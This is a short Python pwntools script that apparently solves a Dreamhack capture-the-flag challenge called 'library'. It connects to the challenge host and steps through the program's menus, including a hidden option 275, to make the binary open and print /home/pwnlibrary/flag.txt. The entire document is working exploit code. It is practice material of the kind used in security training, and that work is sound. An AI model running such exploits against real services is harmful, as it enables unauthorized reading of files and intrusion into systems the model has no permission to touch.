#!/usr/bin/python3

from pwn import *

exe = ELF("./library")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*

        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 8453)
else:
    p = process([exe.path])
# GDB()
sla(b'[+] Select menu : ', b'1')
sla(b'borrow? : ', b'1')
sla(b'[+] Select menu : ', b'3')
sla(b'[+] Select menu : ', b'275')
sla(b'book? : ', b'/home/pwnlibrary/flag.txt')
sla(b'(MAX 400) : ', b'256')
sla(b'[+] Select menu : ', b'2')
sla(b'read? : ', b'0')



p.interactive()

